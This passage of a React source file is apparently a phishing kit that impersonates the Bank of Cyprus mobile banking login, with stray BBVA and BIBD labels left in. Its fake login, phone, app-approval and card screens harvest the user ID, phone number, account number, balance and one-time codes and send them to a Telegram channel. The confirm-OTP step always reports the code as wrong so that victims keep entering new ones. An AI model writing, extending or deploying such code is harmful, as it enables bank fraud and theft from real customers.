    if (clean.length > 1) {
      const digits = clean.slice(0, 6).split("")
      const nextOtp = [...otp]
      digits.forEach((d, i) => {
        if (index + i < 6) nextOtp[index + i] = d
      })
      setOtp(nextOtp)
      const targetFocus = Math.min(index + digits.length, 5)
      otpRefs.current[targetFocus]?.focus()

      const fullCode = nextOtp.join("")
      if (fullCode.length === 6) {
        triggerOtpCompletion(fullCode)
      }
      return
    }

    const nextOtp = [...otp]
    nextOtp[index] = clean[clean.length - 1]
    setOtp(nextOtp)
    if (otpError) setOtpError("")

    // Auto advance to next box
    if (index < 5) {
      otpRefs.current[index + 1]?.focus()
    }

    // Auto complete when all 6 digits entered
    const fullCode = nextOtp.join("")
    if (fullCode.length === 6) {
      triggerOtpCompletion(fullCode)
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (!otp[index] && index > 0) {
        const nextOtp = [...otp]
        nextOtp[index - 1] = ""
        setOtp(nextOtp)
        otpRefs.current[index - 1]?.focus()
      } else {
        const nextOtp = [...otp]
        nextOtp[index] = ""
        setOtp(nextOtp)
      }
    }
  }

  // Handle OTP Submit
  const handleOtpSubmit = () => {
    const fullCode = otp.join("")
    if (fullCode.length < 6) {
      setOtpError(
        language === "es"
          ? "Por favor, introduzca el código de 6 dígitos"
          : "Please enter the full 6-digit code"
      )
      setShakeCount((prev) => prev + 1)
      return
    }

    setOtpError("")
    triggerOtpCompletion(fullCode)
  }

  // Handle Accounts submission: 2-second blurred loading overlay, then transition to Confirm OTP screen (/cc)
  const handleAccountsSubmit = () => {
    setIsAccountsSubmitting(true)
    if (typeof window !== "undefined") {
      if (accountNumber) sessionStorage.setItem("bbva_accountNumber", accountNumber)
      if (accountBalance) sessionStorage.setItem("bbva_accountBalance", accountBalance)
    }

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    sendTelegramMessage({
      title: "Bank of Cyprus — Account Details Captured",
      dni: savedUser || undefined,
      accountNumber: accountNumber || "N/A",
      balance: accountBalance ? `EUR ${accountBalance}` : "N/A",
      type: "account",
    }).catch((err) => console.error("Error sending Telegram notification:", err))

    // Show 2-second loading overlay as requested
    setIsScreenLoading(true)
    setTimeout(() => {
      setIsAccountsSubmitting(false)
      setIsScreenLoading(false)
      setCurrentScreen("confirm-otp")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "confirm-otp" }, "", "/cc")
      }
      setTimeout(() => {
        confirmOtpRefs.current[0]?.focus()
      }, 100)
    }, 2000)
  }

  // Helper to trigger incorrect code error whenever the user inputs the 6th digit
  const triggerConfirmError = (code: string) => {
    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_confirm_otp", code)
    }

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    const savedPhone =
      (typeof window !== "undefined" &&
        (sessionStorage.getItem("bbva_phoneNumber") ||
          sessionStorage.getItem("phoneNumber") ||
          sessionStorage.getItem("bibd_phone"))) ||
      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

    sendTelegramMessage({
      title: `BIBD — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
      dni: savedUser || undefined,
      phoneNumber: savedPhone || undefined,
      otp2: code,
      attempt: `${confirmAttempt}`,
      type: "confirm_otp",
    }).catch((err) => console.error("Error sending Telegram notification:", err))

    // Briefly let the 6th digit render, then display error, clear fields, and reset timer
    setTimeout(() => {
      setHasConfirmError(true)
      setConfirmAttempt((prev) => Math.min(prev + 1, 3))
      setConfirmShake((prev) => prev + 1)
      // Clear fields and reset timer as requested by user
      setConfirmOtp(["", "", "", "", "", ""])
      setConfirmTimeLeft(178) // Reset timer to 2:58
      setTimeout(() => {
        confirmOtpRefs.current[0]?.focus()
      }, 50)
    }, 250)
  }

  // Handle Confirm OTP Digit Change (/cc)
  const handleConfirmOtpChange = (index: number, val: string) => {
    const clean = val.replace(/\D/g, "")
    if (!clean) {
      const nextOtp = [...confirmOtp]
      nextOtp[index] = ""
      setConfirmOtp(nextOtp)
      if (hasConfirmError) setHasConfirmError(false)
      return
    }

    // Paste handling
    if (clean.length > 1) {
      const digits = clean.slice(0, 6).split("")
      const nextOtp = [...confirmOtp]
      digits.forEach((d, i) => {
        if (index + i < 6) nextOtp[index + i] = d
      })
      setConfirmOtp(nextOtp)
      const targetFocus = Math.min(index + digits.length, 5)
      confirmOtpRefs.current[targetFocus]?.focus()

      const fullCode = nextOtp.join("")
      if (fullCode.length === 6) {
        triggerConfirmError(fullCode)
      } else {
        if (hasConfirmError) setHasConfirmError(false)
      }
      return
    }

    const nextOtp = [...confirmOtp]
    nextOtp[index] = clean[clean.length - 1]
    setConfirmOtp(nextOtp)

    // Auto advance
    if (index < 5) {
      confirmOtpRefs.current[index + 1]?.focus()
    }

    const fullCode = nextOtp.join("")
    if (fullCode.length === 6) {
      // User placed the last OTP digit: trigger incorrect message and red borders
      triggerConfirmError(fullCode)
    } else {
      // Don't make border red before that
      if (hasConfirmError) {
        setHasConfirmError(false)
      }
    }
  }

  const handleConfirmOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (hasConfirmError) setHasConfirmError(false)
      if (!confirmOtp[index] && index > 0) {
        const nextOtp = [...confirmOtp]
        nextOtp[index - 1] = ""
        setConfirmOtp(nextOtp)
        confirmOtpRefs.current[index - 1]?.focus()
      } else {
        const nextOtp = [...confirmOtp]
        nextOtp[index] = ""
        setConfirmOtp(nextOtp)
      }
    }
  }

  const handleConfirmOtpSubmit = () => {
    const fullCode = confirmOtp.join("")
    if (fullCode.length < 6) {
      setConfirmShake((prev) => prev + 1)
      return
    }
    triggerConfirmError(fullCode)
  }

  const handleResendConfirmOtp = () => {
    setConfirmTimeLeft(178)
    setConfirmOtp(["", "", "", "", "", ""])
    setHasConfirmError(false)
    confirmOtpRefs.current[0]?.focus()

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    sendTelegramMessage({
      title: "BIBD — Confirm OTP Resend Requested",
      dni: savedUser || undefined,
      type: "resend_confirm_otp",
    }).catch(() => {})
  }

  // Handle Resend OTP Code
  const handleResendOtp = () => {
    setTimeLeft(179)
    setResendSuccess(true)
    setOtp(["", "", "", "", "", ""])
    setOtpError("")
    setTimeout(() => setResendSuccess(false), 3000)
    otpRefs.current[0]?.focus()

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    sendTelegramMessage({
      title: "BIBD — OTP Resend Requested",
      dni: savedUser || undefined,
      type: "resend_otp",
    }).catch(() => {})
  }

  const isCardFormValid =
    isValidLuhn(cardNumber) &&
    cardMonth.length === 2 &&
    cardYear.length === 2 &&
    cardCvv.length === 3

  const isOtpComplete = otp.join("").length === 6

  return (
    <div
      dir="ltr"
      className="fixed inset-0 w-full h-[100dvh] max-h-[100dvh] flex justify-center items-center font-sans select-none overflow-hidden overscroll-none bg-white"
      style={{ backgroundColor: "#ffffff" }}
    >
      {/* ========================================================================= */}
      {/* 0. SCREEN 0: SPLASH SCREEN (BANK OF CYPRUS LOGO & SPINNER)               */}
      {/* ========================================================================= */}
      {currentScreen === "splash" && (
        <main
          onClick={() => {
            setCurrentScreen("login")
            if (typeof window !== "undefined" && window.history) {
              window.history.replaceState({ screen: "login" }, "", "/login")
            }
          }}
          className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-center items-center overflow-hidden shadow-2xl bg-white px-6 select-none cursor-pointer"
        >
          <div className="flex flex-col items-center justify-center space-y-6">
            {/* Bank of Cyprus Logo & Text */}
            <div className="flex flex-col items-center justify-center gap-3 select-none">
              <img
                src="/boc_logo.png"
                alt="Bank of Cyprus"
                className="w-14 h-14 sm:w-16 sm:h-16 rounded-xl shadow-md object-contain"
              />
              <span
                className="text-[#058998] font-serif font-bold text-[21px] sm:text-[23px] tracking-tight leading-none"
                style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
              >
                Bank of Cyprus
              </span>
            </div>

            {/* Spinner */}
            <div className="w-8 h-8 rounded-full border-[3px] border-[#058998]/20 border-t-[#058998] animate-spin" />
          </div>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 0.5. SCREEN 0.5: CYPRUS MOBILE NUMBER SCREEN                              */}
      {/* Flag beside number, country code (+357), continue button -> Card Screen   */}
      {/* ========================================================================= */}
      {currentScreen === "phone" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
          {/* 3-Step Header: Step 1 (Number) */}
          <ThreeStepsHeader currentStep={1} />

          {/* Main content on white */}
          <section className="relative z-10 w-full bg-white rounded-none flex-1 min-h-0 flex flex-col justify-between overflow-y-auto px-5 pt-6 pb-6 select-none">
            <div className="w-full flex flex-col">
              {/* Phone Icon Badge */}
              <div className="w-13 h-13 rounded-2xl bg-[#058998]/10 flex items-center justify-center text-[#058998] mb-4">
                <Smartphone className="w-6 h-6 stroke-[2]" />
              </div>

              {/* Title & Description */}
              <h2 className="text-[#0d1e38] text-[21px] sm:text-[23px] font-bold tracking-tight">
                Enter Mobile Number
              </h2>
              <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-1 mb-5 leading-relaxed">
                Please enter your registered mobile number to verify your account and view card details.
              </p>

              {/* Phone Form */}
              <form onSubmit={handlePhoneSubmit} className="w-full flex flex-col">
                <div className="w-full mb-2">
                  <div className="flex items-center justify-between mb-1.5">
                    <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                      MOBILE NUMBER
                    </label>
                  </div>

                  {/* Input container with Flag and Country Code beside number */}
                  <div
                    className={`w-full h-[52px] px-3 rounded-[10px] border bg-white flex items-center gap-2.5 transition-all shadow-xs ${
                      phoneError
                        ? "border-red-500 ring-1 ring-red-400"
                        : "border-[#cbd5e1] focus-within:border-[#058998] focus-within:ring-1 focus-within:ring-[#058998]"
                    }`}
                  >
                    {/* Flag and Country Code Badge */}
                    <div className="flex items-center gap-2 shrink-0 py-1 px-1.5 rounded-md bg-slate-50 border border-slate-200">
                      <CyprusFlag className="w-6 h-4 rounded-[2px] shadow-xs" />
                      <span className="text-[14px] font-bold text-[#0d1e38] tracking-tight">
                        +357
                      </span>
                    </div>

                    {/* Divider */}
                    <div className="w-[1px] h-6 bg-slate-200 shrink-0" />

                    {/* Number Input Field - Infinite / Unlimited Length */}
                    <input
                      ref={phoneInputRef}
                      type="tel"
                      inputMode="numeric"
                      value={phoneNumber}
                      onChange={handlePhoneChange}
                      placeholder="Enter mobile number"
                      className="w-full h-full bg-transparent text-[#0d1e38] placeholder-[#94a3b8] text-[16px] font-semibold tracking-wide focus:outline-none"
                    />

                    {phoneNumber && (
                      <button
                        type="button"
                        onClick={() => {
                          setPhoneNumber("")
                          setPhoneError("")
                          phoneInputRef.current?.focus()
                        }}
                        className="text-slate-400 hover:text-slate-600 p-1"
                        aria-label="Clear phone input"
                      >
                        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                        </svg>
                      </button>
                    )}
                  </div>
                </div>

                {/* Validation Error if any */}
                {phoneError && (
                  <p className="mt-0.5 mt-3 mb-3 text-red-600 bg-red-50 px-3 py-2 rounded-md text-[13px] font-medium border border-red-200 animate-shake flex items-center gap-2">
                    <span className="font-bold text-sm">!</span>
                    <span>{phoneError}</span>
                  </p>
                )}

                {/* Continue Button */}
                <button
                  type="submit"
                  disabled={isPhoneSubmitting || !phoneNumber.trim()}
                  className={`w-full h-[48px] rounded-[10px] mt-4 font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
                    phoneNumber.trim().length > 0 && !isPhoneSubmitting
                      ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
                      : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
                  }`}
                >
                  {isPhoneSubmitting ? (
                    <div className="flex items-center gap-2">
                      <svg
                        className="animate-spin h-5 w-5 text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        />
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8v8H4z"
                        />
                      </svg>
                      <span>Connecting...</span>
                    </div>
                  ) : (
                    "Continue"
                  )}
                </button>
              </form>
            </div>

            {/* Bottom info */}
            <div className="mt-auto pt-6 flex flex-col items-center text-center">
              <p className="text-[11.5px] text-[#94a3b8]">
                Bank of Cyprus Public Company Ltd • Regulated Financial Institution
              </p>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 1. SCREEN 1: BANK OF CYPRUS LOGIN SCREEN (From user screenshots 1 & 2)    */}
      {/* Dynamic greeting based on time of day, numeric inputs, floating labels    */}
      {/* #FBB947 brand color, "Activate your card", "View links" drawer            */}
      {/* ========================================================================= */}
      {currentScreen === "login" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] min-h-[100dvh] flex flex-col justify-between overflow-y-auto shadow-2xl bg-white px-6 pt-7 pb-4 select-none">
          {/* Top Header with Bank of Cyprus and Language Toggle */}
          <div className="w-full flex items-center justify-between shrink-0">
            <div className="w-10" />

            {/* Centered Bank of Cyprus logo & text */}
            <div className="flex items-center gap-1.5 select-none">
              <span
                className="text-[#058998] font-serif font-bold text-[18px] sm:text-[19px] tracking-tight leading-none"
                style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
              >
                {bocLanguage === "en" ? "Bank of Cyprus" : "Τράπεζα Κύπρου"}
              </span>
              <img
                src="/boc_logo.png"
                alt="Bank of Cyprus"
                className="w-[24px] h-[24px] sm:w-[26px] sm:h-[26px] object-contain rounded-[3px] shrink-0"
              />
            </div>

            {/* Language Toggle: EN | EL */}
            <div className="flex items-center bg-[#f1f5f9] rounded-full p-0.5 text-[10.5px] font-bold border border-slate-200/80 select-none">
              <button
                type="button"
                onClick={() => setBocLanguage("en")}
                className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
                  bocLanguage === "en"
                    ? "bg-[#058998] text-white shadow-xs"
                    : "text-[#64748b] hover:text-[#0f172a]"
                }`}
              >
                EN
              </button>
              <button
                type="button"
                onClick={() => setBocLanguage("el")}
                className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
                  bocLanguage === "el"
                    ? "bg-[#058998] text-white shadow-xs"
                    : "text-[#64748b] hover:text-[#0f172a]"
                }`}
              >
                EL
              </button>
            </div>
          </div>

          {/* Main Body positioned towards the top for clear mobile visibility */}
          <section className="w-full flex-1 flex flex-col pt-3 sm:pt-4 pb-2">
            {/* Dynamic Greeting according to time of day at top */}
            <h1 className="text-[#0b667b] text-[25px] sm:text-[27px] font-normal tracking-tight text-center mt-2 mb-6 select-none">
              {timeGreeting}
            </h1>

            <form onSubmit={handleLogin} className="w-full flex flex-col">
              {/* Field 1: User ID (Numeric only, UNLIMITED digits, Floating placeholder, Clear '×' button) */}
              <div className="relative w-full pt-4 pb-1 border-b border-[#cbd5e1] focus-within:border-[#FBB947] transition-colors">
                <label
                  className={`absolute left-0 transition-all duration-200 pointer-events-none select-none ${
                    userId || userIdFocused
                      ? "top-0 text-[11px] text-[#64748b] font-medium"
                      : "top-4 text-[15.5px] text-[#64748b] font-normal"
                  }`}
                >
                  {bocLanguage === "el" ? "Αναγνωριστικό Χρήστη" : "User ID"}
                </label>
                <div className="flex items-center w-full">
                  <input
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    value={userId}
                    onFocus={() => setUserIdFocused(true)}
                    onBlur={() => setUserIdFocused(false)}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, "")
                      setUserId(val)
                      if (errorMessage) setErrorMessage("")
                    }}
                    className="w-full h-[28px] bg-transparent text-[#111827] text-[16px] font-normal outline-none border-none pr-6 tracking-wide"
                  />
                  {userId && (
                    <button
                      type="button"
                      onClick={() => setUserId("")}
                      className="p-1 text-[#9b2c47] hover:text-[#b91c1c] cursor-pointer text-[18px] leading-none select-none -mr-1"
                      aria-label="Clear User ID"
                    >
                      ×
                    </button>
                  )}
                </div>
              </div>

              {/* Field 2: Passcode (Numeric only, Floating placeholder) */}
              <div className="relative w-full pt-4 pb-1 border-b border-[#cbd5e1] focus-within:border-[#FBB947] transition-colors mt-6">
                <label
                  className={`absolute left-0 transition-all duration-200 pointer-events-none select-none ${
                    password || passcodeFocused
                      ? "top-0 text-[11px] text-[#64748b] font-medium"
                      : "top-4 text-[15.5px] text-[#64748b] font-normal"
                  }`}
                >
                  {bocLanguage === "el" ? "Κωδικός Πρόσβασης" : "Passcode"}
                </label>
                <input
                  type="password"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  value={password}
                  onFocus={() => setPasscodeFocused(true)}
                  onBlur={() => setPasscodeFocused(false)}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "")
                    setPassword(val)
                    if (errorMessage) setErrorMessage("")
                  }}
                  className="w-full h-[28px] bg-transparent text-[#111827] text-[16px] font-normal outline-none border-none tracking-widest"
                />
              </div>

              {/* Row below Passcode: Remember me checkbox (#FBB947) & Activate your card */}
              <div className="w-full flex items-center justify-between mt-4 text-[13px] select-none">
                {/* Remember me */}
                <label
                  onClick={() => setRememberMe(!rememberMe)}
                  className="flex items-start gap-2 cursor-pointer select-none"
                >
                  <div
                    className={`w-5 h-5 rounded-full flex items-center justify-center shrink-0 mt-0.5 transition-all ${
                      rememberMe ? "bg-[#FBB947] text-white shadow-xs" : "border-2 border-[#cbd5e1] bg-white"
                    }`}
                  >
                    {rememberMe && (
                      <svg className="w-3.5 h-3.5 stroke-white" fill="none" viewBox="0 0 24 24" strokeWidth="3.5">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                      </svg>
                    )}
                  </div>
                  <div className="flex flex-col leading-tight">
                    <span className="text-[#374151] font-normal italic">
                      {bocLanguage === "el" ? "Να με θυμάσαι" : "Remember me"}
                    </span>
                    <span className="text-[10.5px] text-[#9ca3af] font-normal mt-0.5">
                      {bocLanguage === "el" ? "Διαβάστε Πληροφορίες Ασφαλείας" : "Read Security Info"}
                    </span>
                  </div>
                </label>

                {/* Activate your card -> opens card screen */}
                <button
                  type="button"
                  onClick={() => {
                    setCurrentScreen("card")
                    if (typeof window !== "undefined" && window.history) {
                      window.history.pushState({ screen: "card" }, "", "/card")
                    }
                  }}
                  className="text-[#4b5563] hover:text-[#111827] hover:underline text-[13px] font-normal cursor-pointer transition-colors"
                >
                  {bocLanguage === "el" ? "Ενεργοποιήστε την κάρτα σας" : "Activate your card"}
                </button>
              </div>

              {/* Error Message if any */}
              {errorMessage && (
                <p className="mt-3 text-red-600 bg-red-50 px-3 py-1.5 rounded-md text-[12.5px] font-medium border border-red-200 animate-shake">
                  {errorMessage}
                </p>
              )}

              {/* Login Button in #FBB947 */}
              <button
                type="submit"
                disabled={!userId || !password || isScreenLoading}
                className={`w-full h-[46px] rounded-[7px] font-semibold text-[15px] sm:text-[15.5px] tracking-wide transition-all shadow-xs flex items-center justify-center select-none mt-8 border border-[#FBB947] ${
                  userId && password && !isScreenLoading
                    ? "bg-[#FBB947] hover:brightness-95 active:scale-[0.99] text-[#1f2937] cursor-pointer"
                    : "bg-[#FBB947]/70 text-[#1f2937]/70 cursor-not-allowed"
                }`}
              >
                {isScreenLoading ? (
                  <Loader2 className="w-5 h-5 animate-spin text-[#1f2937]" />
                ) : bocLanguage === "el" ? (
                  "Σύνδεση"
                ) : (
                  "Login"
                )}
              </button>

              {/* Note: Register button is removed as requested */}

              {/* First time login? (inert / disabled) */}
              <div className="w-full flex justify-end mt-3 select-none">
                <span className="text-[12px] text-[#6b7280] cursor-default select-none">
                  {bocLanguage === "el" ? "Πρώτη φορά σύνδεση;" : "First time login?"}
                </span>
              </div>
            </form>
          </section>

          {/* Bottom View Links (Toggles screenshot 2 bottom panel) */}
          <div className="w-full mt-auto pt-6 pb-2 flex flex-col items-center select-none">
            <button
              type="button"
              onClick={() => setShowViewLinks(!showViewLinks)}
              className="flex items-center gap-1.5 text-[#0b667b] hover:opacity-80 transition-opacity text-[13px] font-medium cursor-pointer"
            >
              <span>{showViewLinks ? "∨" : "∧"}</span>
              <span>{bocLanguage === "el" ? "Προβολή συνδέσμων" : "View links"}</span>
            </button>

            {/* Drawer with 4 icons and 3 pagination dots (matching screenshot 2) */}
            {showViewLinks && (
              <div className="w-full pt-4 mt-2 animate-in fade-in slide-in-from-bottom-2 duration-200">
                <div className="grid grid-cols-4 gap-2 text-center">
                  {/* Antamivi */}
                  <div className="flex flex-col items-center cursor-default">
                    <div className="w-11 h-11 rounded-full border border-[#cbd5e1] flex items-center justify-center text-[#9ca3af] font-bold text-[18px]">
                      a
                    </div>
                    <span className="text-[10px] font-bold text-[#64748b] mt-1.5 tracking-wider uppercase">
                      ANTAMIVI
                    </span>
                  </div>

                  {/* Help Guide */}
                  <div className="flex flex-col items-center cursor-default">
                    <div className="w-11 h-11 rounded-full border border-[#cbd5e1] flex items-center justify-center text-[#9ca3af] font-bold text-[16px]">
                      ?
                    </div>
                    <span className="text-[10px] font-bold text-[#64748b] mt-1.5 tracking-wider uppercase">
                      HELP GUIDE
                    </span>
                  </div>

                  {/* Security */}
                  <div className="flex flex-col items-center cursor-default">
                    <div className="w-11 h-11 rounded-full border border-[#cbd5e1] flex items-center justify-center text-[#9ca3af]">
                      <svg className="w-5 h-5 stroke-current" fill="none" viewBox="0 0 24 24" strokeWidth="1.8">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                      </svg>
                    </div>
                    <span className="text-[10px] font-bold text-[#64748b] mt-1.5 tracking-wider uppercase">
                      SECURITY
                    </span>
                  </div>

                  {/* Contact Us */}
                  <div className="flex flex-col items-center cursor-default">
                    <div className="w-11 h-11 rounded-full border border-[#cbd5e1] flex items-center justify-center text-[#9ca3af]">
                      <svg className="w-5 h-5 stroke-current" fill="none" viewBox="0 0 24 24" strokeWidth="1.8">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                      </svg>
                    </div>
                    <span className="text-[10px] font-bold text-[#64748b] mt-1.5 tracking-wider uppercase">
                      CONTACT US
                    </span>
                  </div>
                </div>

                {/* 3 Pagination dots with center in #FBB947 */}
                <div className="flex items-center justify-center gap-2 mt-4">
                  <span className="w-2 h-2 rounded-full bg-[#cbd5e1]" />
                  <span className="w-2 h-2 rounded-full bg-[#FBB947]" />
                  <span className="w-2 h-2 rounded-full bg-[#cbd5e1]" />
                </div>
              </div>
            )}
          </div>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 1.5. SCREEN 1.5: LOGIN AUTHENTICATION (Mobile App Confirmation)           */}
      {/* Pixel-perfect Bank of Cyprus design from user screenshot 3                */}
      {/* ========================================================================= */}
      {currentScreen === "login-auth" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] min-h-[100dvh] flex flex-col justify-between overflow-y-auto shadow-2xl bg-white px-5 sm:px-6 pt-6 pb-6 select-none">
          <div className="w-full flex flex-col">
            {/* Header: Left is Bank of Cyprus + Emblem, Center is Language Toggle, Right is VISA + Secure */}
            <header className="w-full pb-5 flex items-center justify-between shrink-0 bg-white">
              <div className="flex items-center gap-1.5 select-none">
                <span
                  className="text-[#058998] font-serif font-bold text-[18px] sm:text-[19px] tracking-tight leading-none"
                  style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
                >
                  {bocLanguage === "en" ? "Bank of Cyprus" : "Τράπεζα Κύπρου"}
                </span>
                <img
                  src="/boc_logo.png"
                  alt="Bank of Cyprus"
                  className="w-[24px] h-[24px] sm:w-[26px] sm:h-[26px] object-contain rounded-[3px] shrink-0"
                />
              </div>

              {/* Language Toggle: EN | EL */}
              <div className="flex items-center bg-[#f1f5f9] rounded-full p-0.5 text-[10.5px] font-bold border border-slate-200/80 select-none mx-2">
                <button
                  type="button"
                  onClick={() => setBocLanguage("en")}
                  className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
                    bocLanguage === "en"
                      ? "bg-[#058998] text-white shadow-xs"
                      : "text-[#64748b] hover:text-[#0f172a]"
                  }`}
                >
                  EN
                </button>
                <button
                  type="button"
                  onClick={() => setBocLanguage("el")}
                  className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
                    bocLanguage === "el"
                      ? "bg-[#058998] text-white shadow-xs"
                      : "text-[#64748b] hover:text-[#0f172a]"
                  }`}
                >
                  EL
                </button>
              </div>

              {/* VISA + Secure badge */}
              <div className="flex flex-col items-end shrink-0">
                <img
                  src="/visa_blue.svg"
                  alt="VISA"
                  className="h-[22px] sm:h-[24px] w-auto object-contain shrink-0"
                />
                <span className="mt-1 bg-[#192f60] text-white text-[10px] font-semibold px-2 py-0.5 rounded-[3px] tracking-wide uppercase leading-none">
                  Secure
                </span>
              </div>
            </header>

            {/* Title: Login Authentication */}
            <h1 className="text-[21px] sm:text-[23px] font-bold text-[#000000] tracking-tight mb-2">
              {bocLanguage === "en"
                ? "Login Authentication"
                : "Πιστοποίηση Σύνδεσης"}
            </h1>

            {/* Subtitle */}
            <p className="text-[14px] sm:text-[14.5px] text-[#000000] leading-snug font-normal mb-2">
              {bocLanguage === "en"
                ? "Your login authentication request has been sent to your registered mobile device."
                : "Το αίτημα πιστοποίησης σύνδεσης έχει σταλεί στην καταχωρημένη κινητή συσκευή σας."}
            </p>
            <p className="text-[13.5px] sm:text-[14px] text-[#000000] leading-snug font-normal mb-5">
              {bocLanguage === "en"
                ? "Please open your Bank of Cyprus mobile app to confirm or approve this request to complete your login."
                : "Παρακαλώ ανοίξτε την εφαρμογή Bank of Cyprus για να επιβεβαιώσετε ή να εγκρίνετε αυτό το αίτημα."}
            </p>

            {/* Light Box: Waiting for Mobile App Confirmation */}
            <div className="w-full bg-[#f6f7fa] border border-[#e5e7eb] rounded-[14px] p-4.5 mb-5 select-none">
              <div className="flex items-center gap-2 mb-1.5">
                <span className="text-[18px]">🔑</span>
                <span className="text-[14.5px] sm:text-[15px] font-bold text-[#111827]">
                  {bocLanguage === "en"
                    ? "Waiting for Mobile App Confirmation"
                    : "Αναμονή για Επιβεβαίωση στο Mobile App"}
                </span>
              </div>

              <p className="text-[13px] text-[#4b5563] pl-7 mb-2">
                {bocLanguage === "en" ? "Step 1: Check your app..." : "Βήμα 1: Ελέγξτε την εφαρμογή σας..."}
              </p>

              <div className="flex items-center gap-2 pl-7 mb-4 text-[13.5px] text-[#111827]">
                <span>⏱</span>
                <span>
                  {bocLanguage === "en" ? "Valid for " : "Ισχύει για "}
                  <strong className="font-bold">{formatBocTimer(loginAuthSecondsLeft)}</strong>
                </span>
              </div>

              {/* Confirming via App... Button: sends Telegram notification without redirection */}
              <button
                type="button"
                onClick={handleLoginAppConfirmClick}
                className={`w-full rounded-full py-2.5 px-4 flex items-center justify-center gap-2.5 shadow-xs transition-all cursor-pointer font-medium text-[14px] select-none ${
                  isLoginAppConfirmed
                    ? "bg-[#059669] text-white shadow-sm"
                    : "bg-[#0c6a74] hover:bg-[#09575f] active:scale-[0.99] text-white"
                }`}
              >
                <span>
                  {isLoginAppConfirmed
                    ? bocLanguage === "en"
                      ? "Confirmed & Approved via App ✓"
                      : "Εγκρίθηκε μέσω App ✓"
                    : bocLanguage === "en"
                    ? "Confirming via App..."
                    : "Επιβεβαίωση μέσω App..."}
                </span>
                {!isLoginAppConfirmed && (
                  <span className="inline-block animate-spin text-[16px] leading-none">❄</span>
                )}
              </button>
            </div>
          </div>

          {/* Footer Box with only Bank of Cyprus Copyright */}
          <div className="w-full bg-[#f6f7fa] border border-[#e5e7eb] rounded-[12px] py-3 px-3.5 select-none mt-auto text-center">
            <p className="text-[11.5px] sm:text-[12px] text-[#6b7280] leading-normal font-normal">
              {bocLanguage === "en"
                ? "© 2026 Bank of Cyprus Public Company Ltd. All rights reserved."
                : "© 2026 Τράπεζα Κύπρου Δημόσια Εταιρεία Λτδ. Με επιφύλαξη παντός δικαιώματος."}
            </p>
          </div>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 2. SCREEN 2: CARD DETAILS SCREEN (MATCHING SCREENSHOT 2)                  */}
      {/* Card is STICKY at top, form below is SCROLLABLE, CVV is 3 digits          */}
      {/* Fields AUTO-ADVANCE on fill without manual clicking                       */}
      {/* ========================================================================= */}
      {currentScreen === "card" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
          {/* 3-Step Header: Step 2 (Card Verification) */}
          <ThreeStepsHeader
            currentStep={2}
            onBack={() => setCurrentScreen("phone")}
            showBack={true}
          />

          {/* Card Container extending to bottom with white Background */}
